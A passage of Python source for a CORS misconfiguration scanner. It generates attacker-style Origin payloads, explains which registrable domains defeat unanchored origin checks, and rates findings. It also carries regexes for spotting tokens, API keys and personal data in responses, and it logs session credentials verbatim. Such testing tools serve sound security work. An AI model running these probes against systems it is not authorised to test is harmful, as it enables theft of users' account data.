#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
corshunt - CORS misconfiguration hunter

Part of the *hunt recon suite.

Standard library, plus one optional dependency: tldextract, used only to decide
whether a prepend payload lands on a registrable name or on a sibling subdomain
of the target's own domain. Without it corshunt still runs and falls back to the
heuristic CPython uses in http.cookiejar for the same question.

    pip install tldextract

Design notes
------------
* One worker per URL. All Origin payloads for a given URL are sent over a
  single reused connection, which is why -t counts URLs and not requests.
* Redirects are never followed: the CORS headers on the 30x are the ones
  that matter, and following them wastes requests and can leave scope.
* Severity is deliberately conservative. A permissive Access-Control-Allow-Origin
  without Access-Control-Allow-Credentials is INFO, not a vulnerability: it grants
  an attacker nothing that curl does not already give them. HIGH is reserved for a
  credentialed read of token-bearing data from an attacker-controlled origin.
  corshunt never emits CRITICAL - that requires a demonstrated takeover,
  which is a human call, not a scanner's.
* TLS certificates of targets are not verified (staging hosts, intercepting
  proxies). This is a recon tool, not a client.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import html
import http.client
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
from urllib.parse import urlsplit

VERSION = "1.0.0"
TOOL = "corshunt"

BODY_KEEP = 65536          # bytes of body retained for analysis
BODY_DRAIN = 1048576       # drain up to this much before giving up on connection reuse
SNIPPET = 400              # bytes of body stored in the JSON report
TLD_SENTINEL = "xyz"       # appended to the target's TLD by the tldext class

# --------------------------------------------------------------------------- #
# severity
# --------------------------------------------------------------------------- #

INFO, LOW, MEDIUM, HIGH = "INFO", "LOW", "MEDIUM", "HIGH"
SEV_RANK = {INFO: 0, LOW: 1, MEDIUM: 2, HIGH: 3}


def sev_cap(current: str, ceiling: str) -> str:
    """Lower `current` to `ceiling` if it sits above it."""
    return ceiling if SEV_RANK[current] > SEV_RANK[ceiling] else current


# --------------------------------------------------------------------------- #
# payload classes
# --------------------------------------------------------------------------- #
#
# control:
#   yes   - the permitted origin is one an attacker can actually serve from
#   chain - needs another bug or asset first (XSS, subdomain takeover, MITM)
#   no    - the permitted origin is the target's own; nothing to exploit
#
# host_mut: the payload mutates the hostname, so it is meaningless against a
#           bare IP target and gets filtered out there.

PAYLOADS = {
    "reflect": {
        "default": True, "control": "yes", "host_mut": False,
        "desc": "arbitrary attacker origin - detects blanket reflection",
        "requires": None,
    },
    "null": {
        "default": True, "control": "yes", "host_mut": False,
        "desc": "Origin: null - sandboxed iframe or data: URL",
        "requires": None,
    },
    "append": {
        "default": True, "control": "yes", "host_mut": True,
        "desc": "<host>.<attacker> - server does a prefix match / unanchored ^",
        "requires": None,
    },
    "prepend": {
        "default": True, "control": "yes", "host_mut": True,
        "desc": "<attacker-prefix><host> - server does a suffix match / unanchored $"
                " (control is yes only when the target IS the registrable domain;"
                " on a subdomain the payload is a sibling subdomain, same as sub)",
        "requires": "registering a domain ending in the target name",
    },
    "tldext": {
        "default": True, "control": "yes", "host_mut": True,
        "desc": f"<host>{TLD_SENTINEL} - unanchored TLD check "
                "(legitdomain.com -> legitdomain.comxyz)",
        "requires": "registering a real domain whose TLD extends the target's "
                    "(legitdomain.com -> legitdomain.computer / .company); the "
                    "sentinel origin itself is only the canary",
    },
    "sub": {
        "default": True, "control": "chain", "host_mut": True,
        "desc": "<random>.<host> - wildcard subdomain trust",
        "requires": "XSS or subdomain takeover on a subdomain of the target",
    },
    "scheme": {
        "default": True, "control": "chain", "host_mut": False,
        "desc": "http://<host> - insecure scheme accepted",
        "requires": "an active network position (MITM) to serve the http origin",
    },
    "tdot": {
        "default": True, "control": "no", "host_mut": True,
        "desc": "<host>. - trailing dot accepted",
        "requires": "cache-key or routing tricks; the origin is still the target's own",
    },
    "dot": {
        "default": False, "control": "chain", "host_mut": True,
        "desc": "<host with . replaced> - unescaped dot in a validation regex",
        "requires": "the mutated name to be registrable",
    },
    "port": {
        "default": False, "control": "no", "host_mut": False,
        "desc": "<host>:<random port> - port not validated",
        "requires": "control of another service on the target host",
    },
    "case": {
        "default": False, "control": "no", "host_mut": True,
        "desc": "mixed-case host - case-insensitive comparison",
        "requires": "nothing exploitable; the origin is the target's own",
    },
    "special": {
        "default": False, "control": "yes", "host_mut": True,
        "desc": "hostname parser quirks (_ ` { } ^) - browser dependent",
        "requires": "a browser whose URL parser accepts the character",
    },
}

IPV4_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")
SPECIAL_CHARS = ["_", "`", "{", "}", "^", "!"]

# --------------------------------------------------------------------------- #
# TLD extension
# --------------------------------------------------------------------------- #
#
# A validator that matches the allowed origin without anchoring the end of the
# string - origin.startswith(site), re.match(site, origin), site in origin -
# accepts any TLD that merely BEGINS with the real one. Detection needs no TLD
# data at all: append a sentinel to the target's own TLD and see whether it is
# accepted.
#
#   legitdomain.com -> legitdomain.comxyz
#
# If that comes back in Access-Control-Allow-Origin, the check is unanchored,
# which is the whole finding. Exploiting it means swapping the sentinel for a
# real longer TLD, which for most TLDs exists and is open to registration:
#
#   legitdomain.com -> legitdomain.computer / .company / .community / .compare
#   legitdomain.ca  -> legitdomain.camera / .cafe / .cars / .casino
#   legitdomain.pa  -> legitdomain.paris / .partners / .party
#   legitdomain.de  -> legitdomain.dev / .design / .delivery / .dentist
#
# No extra label is added either, so this slips past validators that reject a
# parent-domain append by counting dots or refusing a subdomain.
#
# The sentinel itself lives with the other constants at the top of the file.

# --------------------------------------------------------------------------- #
# body analysis
# --------------------------------------------------------------------------- #

TOKEN_RE = re.compile(
    r"""(
        eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}          # JWT
      | AKIA[0-9A-Z]{16}                                    # AWS access key id
      | gh[pousr]_[A-Za-z0-9]{20,}                          # GitHub token
      | xox[baprs]-[A-Za-z0-9\-]{10,}                       # Slack token
      | ["']?(?:access_token|refresh_token|id_token|api[_\-]?key|apikey
          |secret|client_secret|private_key|session[_\-]?id|sessionid
          |csrf[_\-]?token|xsrf[_\-]?token|authenticity_token|auth[_\-]?token)
        ["']?\s*[:=]\s*["'][^"']{8,}["']
    )""",
    re.IGNORECASE | re.VERBOSE,
)

PII_RE = re.compile(
    r"""["']?(?:e?mail|phone|mobile|address|street|zip|postal|iban|ssn|siret
        |first[_\-]?name|last[_\-]?name|full[_\-]?name|username|user[_\-]?id
        |date[_\-]?of[_\-]?birth|birth[_\-]?date|dob|balance|invoice)["']?\s*[:=]""",
    re.IGNORECASE | re.VERBOSE,
)

CACHEABLE_RE = re.compile(r"\b(public|s-maxage|max-age=[1-9])", re.IGNORECASE)
NOCACHE_RE = re.compile(r"\b(no-store|private|no-cache)", re.IGNORECASE)

# --------------------------------------------------------------------------- #
# colors
# --------------------------------------------------------------------------- #

ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")


class Palette:
    _CODES = {
        "reset": "0", "bold": "1", "dim": "2", "ital": "3", "under": "4",
        "red": "31", "green": "32", "yellow": "33", "blue": "34",
        "magenta": "35", "cyan": "36", "grey": "90",
        "bred": "91", "bgreen": "92", "byellow": "93", "bblue": "94",
        "bmagenta": "95", "bcyan": "96", "white": "97",
    }

    def __init__(self, enabled: bool):
        self.enabled = enabled
        for name, code in self._CODES.items():
            setattr(self, name, f"\x1b[{code}m" if enabled else "")

    def p(self, text, *styles) -> str:
        if not self.enabled or not styles:
            return str(text)
        return "".join(getattr(self, s) for s in styles) + str(text) + self.reset


SEV_STYLE = {
    HIGH: ("bold", "bred"),
    MEDIUM: ("bold", "byellow"),
    LOW: ("bcyan",),
    INFO: ("grey",),
}

# --------------------------------------------------------------------------- #
# printer
# --------------------------------------------------------------------------- #


class Printer:
    def __init__(self, palette: Palette, text_path: str | None):
        self.pal = palette
        self.lock = threading.Lock()
        self.fh = open(text_path, "w", encoding="utf-8") if text_path else None

    def out(self, line: str = ""):
        with self.lock:
            sys.stdout.write(line + "\n")
            sys.stdout.flush()
            if self.fh:
                self.fh.write(ANSI_RE.sub("", line) + "\n")

    def err(self, line: str):
        with self.lock:
            sys.stderr.write(line + "\n")
            sys.stderr.flush()
            if self.fh:
                self.fh.write(ANSI_RE.sub("", line) + "\n")

    def close(self):
        if self.fh:
            self.fh.close()
            self.fh = None


# --------------------------------------------------------------------------- #
# rate limiting
# --------------------------------------------------------------------------- #


class RateGate:
    """Minimum gap between requests, enforced globally across all threads."""

    def __init__(self, delay: float):
        self.delay = delay or 0.0
        self.lock = threading.Lock()
        self.next_slot = 0.0

    def wait(self):
        if self.delay <= 0:
            return
        with self.lock:
            now = time.monotonic()
            sleep_for = max(0.0, self.next_slot - now)
            self.next_slot = max(now, self.next_slot) + self.delay
        if sleep_for:
            time.sleep(sleep_for)


# --------------------------------------------------------------------------- #
# stats
# --------------------------------------------------------------------------- #


class Stats:
    def __init__(self, total: int):
        self.lock = threading.Lock()
        self.total = total
        self.tested = 0
        self.requests = 0
        self.errors = 0
        self.findings = 0
        self.by_sev = {HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0}
        self.start = time.monotonic()

    def bump(self, **kw):
        with self.lock:
            for k, v in kw.items():
                setattr(self, k, getattr(self, k) + v)

    def finding(self, sev: str):
        with self.lock:
            self.findings += 1
            self.by_sev[sev] += 1

    def snapshot(self):
        with self.lock:
            return dict(
                total=self.total, tested=self.tested, requests=self.requests,
                errors=self.errors, findings=self.findings,
                by_sev=dict(self.by_sev), elapsed=time.monotonic() - self.start,
            )


def hms(seconds: float) -> str:
    seconds = int(max(0, seconds))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h}:{m:02d}:{s:02d}" if h else f"{m:02d}:{s:02d}"


# --------------------------------------------------------------------------- #
# HTTP
# --------------------------------------------------------------------------- #


class Response:
    __slots__ = ("status", "reason", "headers", "body", "body_len", "elapsed", "error")

    def __init__(self, status=0, reason="", headers=None, body=b"", body_len=0,
                 elapsed=0.0, error=None):
        self.status = status
        self.reason = reason
        self.headers = headers or []          # list of (name, value), order preserved
        self.body = body
        self.body_len = body_len
        self.elapsed = elapsed
        self.error = error

    def get_all(self, name: str) -> list[str]:
        low = name.lower()
        return [v for (k, v) in self.headers if k.lower() == low]

    def get(self, name: str, default=None):
        vals = self.get_all(name)
        return vals[0] if vals else default

    @property
    def ok(self) -> bool:
        return self.error is None


class Target:
    __slots__ = ("url", "scheme", "host", "port", "path", "method", "body",
                 "base_headers")

    def __init__(self, url, scheme, host, port, path, method="GET", body=None,
                 base_headers=None):
        self.url = url
        self.scheme = scheme
        self.host = host
        self.port = port
        self.path = path
        self.method = method
        self.body = body
        self.base_headers = base_headers or []

    @property
    def hostport(self) -> str:
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"

    @property
    def origin(self) -> str:
        return f"{self.scheme}://{self.hostport}"


class Conn:
    """One keep-alive connection to a single target, with proxy support."""

    def __init__(self, target: Target, proxy: str | None, timeout: float):
        self.t = target
        self.timeout = timeout
        self.proxy = urlsplit(proxy) if proxy else None
        self.c = None
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

    def _open(self):
        t = self.t
        if self.proxy:
            ph, pp = self.proxy.hostname, self.proxy.port or 8080
            if t.scheme == "https":
                self.c = http.client.HTTPSConnection(ph, pp, timeout=self.timeout,
                                                     context=self.ctx)
                self.c.set_tunnel(t.host, t.port)
            else:
                self.c = http.client.HTTPConnection(ph, pp, timeout=self.timeout)
        elif t.scheme == "https":
            self.c = http.client.HTTPSConnection(t.host, t.port, timeout=self.timeout,
                                                 context=self.ctx)
        else:
            self.c = http.client.HTTPConnection(t.host, t.port, timeout=self.timeout)

    def close(self):
        if self.c is not None:
            try:
                self.c.close()
            except Exception:
                pass
            self.c = None

    def request(self, headers: list[tuple[str, str]], attempt: int = 0) -> Response:
        t = self.t
        # plain http through a forward proxy uses the absolute-URI request form
        if self.proxy and t.scheme == "http":
            req_target = f"http://{t.hostport}{t.path}"
        else:
            req_target = t.path

        hdr = {k: v for (k, v) in headers}
        started = time.monotonic()
        try:
            if self.c is None:
                self._open()
            self.c.request(t.method, req_target, body=t.body, headers=hdr)
            raw = self.c.getresponse()
            body = raw.read(BODY_KEEP)
            total = len(body)
            leftover = True
            drained = 0
            while drained < BODY_DRAIN:
                chunk = raw.read(min(65536, BODY_DRAIN - drained))
                if not chunk:
                    leftover = False
                    break
                drained += len(chunk)
                total += len(chunk)
            resp = Response(
                status=raw.status, reason=raw.reason,
                headers=list(raw.getheaders()), body=body, body_len=total,
                elapsed=time.monotonic() - started,
            )
            if leftover and drained >= BODY_DRAIN:
                self.close()          # body too large to drain, drop the connection
            elif raw.will_close:
                self.close()
            return resp
        except (http.client.HTTPException, socket.timeout, socket.error,
                ssl.SSLError, OSError) as exc:
            self.close()
            if attempt == 0:
                return self.request(headers, attempt=1)
            return Response(error=f"{type(exc).__name__}: {exc}",
                            elapsed=time.monotonic() - started)


# --------------------------------------------------------------------------- #
# input parsing
# --------------------------------------------------------------------------- #


def parse_url(raw: str) -> Target | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if "://" not in raw:
        raw = "https://" + raw
    u = urlsplit(raw)
    if u.scheme not in ("http", "https") or not u.hostname:
        return None
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return Target(raw, u.scheme, u.hostname, port, path)


def parse_raw_request(path: str, force_ssl: bool) -> Target:
    """Replay a Burp/ZAP raw request export: method, headers and body verbatim."""
    with open(path, "rb") as fh:
        data = fh.read()
    data = data.replace(b"\r\n", b"\n")
    if b"\n\n" in data:
        head, body = data.split(b"\n\n", 1)
    else:
        head, body = data, b""
    lines = head.decode("utf-8", "replace").split("\n")
    while lines and not lines[0].strip():
        lines.pop(0)
    if not lines:
        raise ValueError("empty request file")

    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"cannot parse request line: {lines[0]!r}")
    method, req_target = parts[0].upper(), parts[1]

    headers: list[tuple[str, str]] = []
    for line in lines[1:]:
        if not line.strip() or ":" not in line:
            continue
        k, v = line.split(":", 1)
        headers.append((k.strip(), v.strip()))

    lookup = {k.lower(): v for k, v in headers}

    # scheme: --force-ssl wins, else deduced from Origin/Referer, else http
    scheme = "http"
    for h in ("origin", "referer"):
        val = lookup.get(h, "")
        if val.startswith("https://"):
            scheme = "https"
            break
        if val.startswith("http://"):
            scheme = "http"
            break
    if force_ssl:
        scheme = "https"

    if "://" in req_target:
        u = urlsplit(req_target)
        host, port = u.hostname, u.port
        path = (u.path or "/") + (("?" + u.query) if u.query else "")
        scheme = "https" if force_ssl else u.scheme
    else:
        hostline = lookup.get("host", "")
        if not hostline:
            raise ValueError("no Host header and no absolute request URI")
        if ":" in hostline:
            host, p = hostline.rsplit(":", 1)
            port = int(p)
        else:
            host, port = hostline, None
        path = req_target

    port = port or (443 if scheme == "https" else 80)
    body_out = body if body.strip() else None

    # Content-Length is recomputed by http.client; Origin is injected per payload
    keep = [(k, v) for (k, v) in headers
            if k.lower() not in ("origin", "content-length", "accept-encoding",
                                 "connection")]
    url = f"{scheme}://{host}:{port}{path}"
    return Target(url, scheme, host, port, path, method=method, body=body_out,
                  base_headers=keep)


def parse_header_arg(raw: str) -> tuple[str, str] | None:
    raw = raw.strip()
    if not raw or raw.startswith("#") or ":" not in raw:
        return None
    k, v = raw.split(":", 1)
    k = k.strip()
    return (k, v.strip()) if k else None


def load_header_file(path: str) -> list[tuple[str, str]]:
    out = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            h = parse_header_arg(line)
            if h:
                out.append(h)
    return out


class AuthStore:
    """--auth-file (every target) or --auth-dir (per host, no inheritance)."""

    def __init__(self, auth_file: str | None, auth_dir: str | None):
        self.global_headers = load_header_file(auth_file) if auth_file else []
        self.dir = auth_dir
        self.cache: dict[str, list[tuple[str, str]]] = {}
        self.lock = threading.Lock()

    def for_target(self, t: Target) -> list[tuple[str, str]]:
        if not self.dir:
            return list(self.global_headers)
        key = f"{t.host}_{t.port}"
        with self.lock:
            if key in self.cache:
                return list(self.cache[key])
        headers: list[tuple[str, str]] = []
        for name in (f"{t.host}_{t.port}.txt", f"{t.host}.txt"):
            candidate = os.path.join(self.dir, name)
            if os.path.isfile(candidate):
                headers = load_header_file(candidate)
                break
        with self.lock:
            self.cache[key] = headers
        return list(headers)


def merge_headers(*groups: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """Later groups override earlier ones on the same header name."""
    out: list[tuple[str, str]] = []
    seen: dict[str, int] = {}
    for group in groups:
        for k, v in group:
            low = k.lower()
            if low in seen:
                out[seen[low]] = (k, v)
            else:
                seen[low] = len(out)
                out.append((k, v))
    return out


def auth_mechanism(headers: list[tuple[str, str]]) -> str:
    names = {k.lower() for k, _ in headers}
    if "cookie" in names:
        return "cookie"
    header_auth = {"authorization", "x-api-key", "api-key", "x-auth-token",
                   "x-access-token", "x-csrf-token", "x-session-token"}
    if names & header_auth:
        return "header"
    return "none"


def fmt_headers(headers: list[tuple[str, str]]) -> list[str]:
    """Verbatim, always. A report you cannot replay is not a report: the exact
    Cookie and Authorization values are what let you re-run the request."""
    return [f"{k}: {v}" for k, v in headers]


# --------------------------------------------------------------------------- #
# payload generation
# --------------------------------------------------------------------------- #


def rand_tag(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def gen_payloads(t: Target, attacker: str, force_ssl: bool, enabled: set[str]):
    """Return (sendable, skipped) where each item is (cls, origin, reason)."""
    psch = "https" if force_ssl else t.scheme
    host, hp = t.host, t.hostport
    port_suffix = hp[len(host):]          # ":8443" or ""
    is_ip = bool(IPV4_RE.match(host)) or ":" in host
    tag = rand_tag()

    # A port only ever goes at the END of an authority: "host:8099.evil.tld" parses
    # as an invalid port, so no browser can ever send it as an Origin and a finding
    # built on it would be unexploitable. Classes that mutate into the attacker's
    # own domain therefore carry no target port at all (the attacker picks their
    # own); classes whose origin stays on the target host keep it, last.
    candidates: list[tuple[str, str]] = [
        ("reflect", f"{psch}://{TOOL}-{tag}.{attacker}"),
        ("null", "null"),
        ("append", f"{psch}://{host}.{attacker}"),
        # the port stays on prepend: "xyzhost:8099" is a legal authority AND
        # servable, so it reaches an endswith() check that includes the port
        ("prepend", f"{psch}://{tag}{hp}"),
        ("tldext", f"{psch}://{host}{TLD_SENTINEL}{port_suffix}"),
        ("sub", f"{psch}://{TOOL}-{tag}.{hp}"),
        ("scheme", f"http://{hp}"),
        ("tdot", f"{t.scheme}://{host}.{port_suffix}"),
        ("dot", f"{psch}://{host.replace('.', tag[0], 1)}"),
        ("port", f"{t.scheme}://{host}:1337"),
        ("case", f"{t.scheme}://{_altcase(host)}{port_suffix}"),
        ("special", f"{psch}://{host}_.{attacker}"),
    ]
    if port_suffix:
        # only when the target is on a non-default port do the with-port and
        # without-port shapes differ: an endswith() check that ignores the port
        # needs the bare host, one that includes it needs the variant above
        candidates.insert(4, ("prepend", f"{psch}://{tag}{host}"))

    sendable, skipped = [], []
    for cls, origin in candidates:
        if cls not in enabled:
            spec = PAYLOADS[cls]
            why = (f"disabled with --no-{cls}" if spec["default"]
                   else "not in the default set (enable with --deep)")
            skipped.append((cls, origin, why))
            continue
        if is_ip and PAYLOADS[cls]["host_mut"]:
            skipped.append((cls, origin, "target is a bare IP: hostname mutation is "
                                         "meaningless"))
            continue
        if cls == "scheme" and t.scheme == "http":
            skipped.append((cls, origin, "target is already http"))
            continue
        if cls == "dot" and "." not in host:
            skipped.append((cls, origin, "host has no dot to mangle"))
            continue
        sendable.append((cls, origin, None))

    return sendable, skipped


def _altcase(s: str) -> str:
    return "".join(ch.upper() if i % 2 == 0 else ch.lower() for i, ch in enumerate(s))


# Where the registrable domain starts is a data question, not a parsing one:
# abonnement.legitdomain.com and target.co.uk are both three labels, yet the
# first is a subdomain of someone's domain and the second IS the domain. Only the
# Public Suffix List settles it, so tldextract answers when it is installed.
#
#   pip install tldextract
#
# Without it, corshunt falls back to the heuristic CPython itself uses for this
# same sub-problem in http.cookiejar.DefaultCookiePolicy.set_ok_domain: count the
# labels, then check the second level against a short set of registry labels.
# Correct on ordinary shapes, blind to hosting suffixes such as github.io.

try:
    import tldextract as _tldextract
except ImportError:                       # optional: only prepend severity needs it
    _tldextract = None

REGISTRY_SLDS = frozenset("""
ac asn biz co com edu firm gen go gov govt id ind info k12 lg ltd me mil ne net
nom or org plc priv res sch travel web
""".split())

_psl_lock = threading.Lock()
_psl_cache = None


def _psl():
    """tldextract bound to the snapshot shipped inside the package.

    suffix_list_urls=() and cache_dir=None keep a recon run offline and
    deterministic: no surprise request to publicsuffix.org from a scanner, no
    cache files written into the operator's home. The PRIVATE section is included
    on purpose - github.io, vercel.app, pages.dev and friends hand out names, so
    a prefixed sibling there really is obtainable.
    """
    global _psl_cache
    if _tldextract is None:
        return None
    with _psl_lock:                       # build once, not once per thread
        if _psl_cache is None:
            _psl_cache = _tldextract.TLDExtract(
                suffix_list_urls=(), cache_dir=None,
                include_psl_private_domains=True)
    return _psl_cache


def registrable_split(host: str) -> tuple[str, str, str]:
    """(subdomain, domain, suffix). An empty subdomain means the host IS the
    registrable domain; an empty suffix means there is no domain to register at
    all (bare IP, intranet name, or a public suffix on its own)."""
    ex = _psl()
    if ex is not None:
        r = ex(host)
        return r.subdomain, r.domain, r.suffix
    labels = host.lower().split(".")
    depth = 3 if (len(labels) >= 3 and len(labels[-1]) == 2
                  and labels[-2] in REGISTRY_SLDS) else 2
    if len(labels) < depth:
        return "", host, ""
    return ".".join(labels[:-depth]), labels[-depth], ".".join(labels[-depth + 1:])


def payload_control(cls: str, host: str) -> tuple[str, str | None]:
    """(control, explanation) for this class against this particular host.

    Mostly static, but `prepend` turns on one question: is the target the
    registrable domain, or a subdomain of it? A TLD is never for sale, so the
    boundary is the domain, and the subdomain part of the split answers it.

      legitdomain.com    -> taglegitdomain.com      subdomain empty
      target.co.uk       -> tagtarget.co.uk         subdomain empty
      target.github.io   -> tagtarget.github.io     subdomain empty
          a registrable name of its own: the attacker takes it and serves from
          it, so the origin really is theirs. control yes.
      abonnement.legitdomain.com -> tagabonnement.legitdomain.com
      api.target.co.uk           -> tagapi.target.co.uk
          the prefix lands on a label under the target's OWN registrable domain,
          so the payload is a sibling subdomain and serving it needs exactly what
          the sub class needs. control no.

    Rating a buyable name as INFO would not be conservative, it would be wrong
    and would drop a real finding, which is why this is looked up rather than
    guessed from the number of dots.
    """
    spec = PAYLOADS[cls]
    if cls == "prepend":
        sub, dom, suf = registrable_split(host)
        if not dom or not suf:
            return "no", (
                "the host is not a registrable domain - a bare IP, an intranet name "
                "or a public suffix on its own - so there is no name to take that "
                "would carry this origin")
        if sub:
            return "no", (
                f"the payload prefixes a label under {dom}.{suf}, which is the "
                "target's own registrable domain, so it is a sibling subdomain "
                "rather than a name of its own: serving it needs what the sub class "
                "needs - XSS or a takeover on a subdomain of the target")
        return "yes", f"registering a domain ending in {dom}.{suf}"
    return spec["control"], spec["requires"]


# --------------------------------------------------------------------------- #
# assessment
# --------------------------------------------------------------------------- #


def origin_matches(acao: str, sent: str) -> bool:
    return acao.strip().rstrip("/").lower() == sent.strip().rstrip("/").lower()


def body_signals(body: bytes) -> tuple[bool, bool]:
    text = body.decode("utf-8", "replace")
    return bool(TOKEN_RE.search(text)), bool(PII_RE.search(text))


def observed_samesite(resp: Response) -> str | None:
    best = None
    for raw in resp.get_all("set-cookie"):
        m = re.search(r"samesite\s*=\s*(strict|lax|none)", raw, re.IGNORECASE)
        if m:
            val = m.group(1).lower()
            if val == "none":
                return "none"      # the permissive one wins: exploitation stays open
            best = best or val
        elif best is None:
            best = "lax"           # unspecified: Chromium/Firefox default to Lax
    return best


def cacheable(resp: Response) -> bool:
    cc = " ".join(resp.get_all("cache-control") + resp.get_all("pragma"))
    if NOCACHE_RE.search(cc):
        return False
    return bool(CACHEABLE_RE.search(cc)) or not cc.strip()


class Finding(dict):
    pass


def assess(t: Target, cls: str, origin: str, resp: Response, ctx: dict) -> Finding | None:
    """Turn one probe into a finding, or None when there is nothing to report."""
    acao_all = resp.get_all("access-control-allow-origin")
    if not acao_all:
        return None
    acao = acao_all[0]
    acac = any(v.strip().lower() == "true"
               for v in resp.get_all("access-control-allow-credentials"))
    spec = PAYLOADS[cls]
    notes: list[str] = []
    requires: list[str] = []

    if len(acao_all) > 1:
        notes.append("multiple Access-Control-Allow-Origin headers: browsers reject "
                     "the response, but it signals a proxy/application mismatch")

    if acao.strip() == "*":
        kind = "cors-wildcard"
        sev = INFO
        if acac:
            notes.append("Access-Control-Allow-Credentials: true alongside "
                         "Access-Control-Allow-Origin: * - browsers refuse this "
                         "combination, so it is not exploitable as it stands")
        else:
            notes.append("wildcard without credentials: the standard configuration "
                         "for a public API, and readable by any HTTP client anyway")
        confidence = "confirmed"
    elif not origin_matches(acao, origin):
        return None     # a static allowlist that did not take our origin: not a finding
    else:
        kind = "cors-read"
        confidence = "confirmed"
        if not acac:
            sev = INFO
            notes.append("no Access-Control-Allow-Credentials: the response is "
                         "readable by any HTTP client, so reflection alone grants "
                         "the attacker nothing")
        else:
            control, control_why = payload_control(cls, t.host)
            if control == "no":
                sev = INFO
                notes.append(control_why or "the permitted origin is the target's "
                                            "own: nothing for an attacker to serve from")
            elif control == "chain":
                sev = LOW
            else:
                sev = MEDIUM

            if control != "no" and control_why:
                requires.append(control_why)

            if sev != INFO:
                mech = ctx["auth_mech"]
                if mech == "header":
                    sev = sev_cap(sev, LOW)
                    notes.append("the target was authenticated with a request header, "
                                 "not a cookie: a browser will not attach it "
                                 "cross-site, so this is probably not reachable "
                                 "through CORS")
                elif mech == "none":
                    sev = sev_cap(sev, LOW)
                    notes.append("scanned unauthenticated: the sensitivity of the "
                                 "credentialed response is unverified - rerun with "
                                 "--auth-file/--auth-dir before reporting")
                ss = ctx["samesite"]
                if ss in ("lax", "strict"):
                    sev = sev_cap(sev, LOW)
                    notes.append(f"Set-Cookie SameSite={ss} observed: a cross-site "
                                 "fetch will not carry the session cookie")
                elif ss == "none":
                    notes.append("Set-Cookie SameSite=None observed: the cookie does "
                                 "travel cross-site")

                if (sev == MEDIUM and mech == "cookie" and ctx["authed_differs"]
                        and ctx["token_like"]):
                    sev = HIGH
                if sev == MEDIUM and mech == "cookie" and not ctx["authed_differs"]:
                    sev = sev_cap(sev, LOW)
                    notes.append("the response is byte-identical with and without the "
                                 "session: nothing user-specific to steal here")

    acam = resp.get("access-control-allow-methods")
    acah = resp.get("access-control-allow-headers")
    aceh = resp.get("access-control-expose-headers")
    if aceh:
        notes.append(f"Access-Control-Expose-Headers: {aceh}")
    if acah and ("*" in acah or "authorization" in acah.lower()):
        notes.append(f"Access-Control-Allow-Headers: {acah}")

    if kind != "cors-wildcard" and (
            not resp.get("vary") or "origin" not in (resp.get("vary") or "").lower()):
        if cacheable(resp):
            notes.append("no Vary: Origin on a cacheable response: a shared cache or "
                         "CDN may serve the attacker's Access-Control-Allow-Origin to "
                         "other users, which turns this from a per-victim bug into a "
                         "stored one")
        else:
            notes.append("no Vary: Origin (response does not look cacheable)")

    return Finding(
        kind=kind, severity=sev, confidence=confidence, cls=cls,
        url=t.url, method=t.method, origin_sent=origin, acao=acao, acac=acac,
        acam=acam, acah=acah, aceh=aceh,
        status=resp.status, length=resp.body_len,
        content_type=resp.get("content-type", ""),
        vary=resp.get("vary"), samesite=ctx["samesite"],
        auth_mech=ctx["auth_mech"], authed_differs=ctx["authed_differs"],
        token_like=ctx["token_like"], pii_like=ctx["pii_like"],
        requires=requires, notes=notes,
        snippet=resp.body[:SNIPPET].decode("utf-8", "replace"),
        request_headers=fmt_headers(ctx["sent_headers"]),
    )


def assess_preflight(t: Target, origin: str, resp: Response, ctx: dict) -> Finding | None:
    acao = resp.get("access-control-allow-origin")
    if not acao or not origin_matches(acao, origin):
        return None
    acac = any(v.strip().lower() == "true"
               for v in resp.get_all("access-control-allow-credentials"))
    acam = (resp.get("access-control-allow-methods") or "")
    methods = {m.strip().upper() for m in acam.split(",") if m.strip()}
    writes = methods & {"PUT", "DELETE", "PATCH", "POST"} or ("*" in methods)
    if not (acac and writes):
        return None

    notes = ["the preflight approves a state-changing method from an attacker origin "
             "with credentials: cross-origin writes with a JSON body become possible, "
             "which also defeats Content-Type based CSRF protection"]
    sev = MEDIUM
    if ctx["auth_mech"] != "cookie":
        sev = LOW
        notes.append("no cookie authentication configured for this target: verify the "
                     "session actually rides along before reporting")
    if ctx["samesite"] in ("lax", "strict"):
        sev = LOW
        notes.append(f"Set-Cookie SameSite={ctx['samesite']} observed: the cross-site "
                     "write will not carry the session cookie")

    return Finding(
        kind="cors-write", severity=sev, confidence="needs-browser", cls="preflight",
        url=t.url, method="OPTIONS", origin_sent=origin, acao=acao, acac=acac,
        acam=acam, acah=resp.get("access-control-allow-headers"),
        aceh=resp.get("access-control-expose-headers"),
        status=resp.status, length=resp.body_len,
        content_type=resp.get("content-type", ""),
        vary=resp.get("vary"), samesite=ctx["samesite"],
        auth_mech=ctx["auth_mech"], authed_differs=ctx["authed_differs"],
        token_like=False, pii_like=False, requires=[], notes=notes,
        snippet="", request_headers=fmt_headers(ctx["sent_headers"]),
    )


# --------------------------------------------------------------------------- #
# scanning
# --------------------------------------------------------------------------- #

UA = f"Mozilla/5.0 ({TOOL}/{VERSION})"


class Scanner:
    def __init__(self, args, pal: Palette, pr: Printer, stats: Stats,
                 auth: AuthStore, enabled: set[str], stop: threading.Event):
        self.a = args
        self.pal = pal
        self.pr = pr
        self.stats = stats
        self.auth = auth
        self.enabled = enabled
        self.stop = stop
        self.gate = RateGate(args.delay)
        self.findings: list[Finding] = []
        self.flock = threading.Lock()

    # -- plumbing --------------------------------------------------------- #

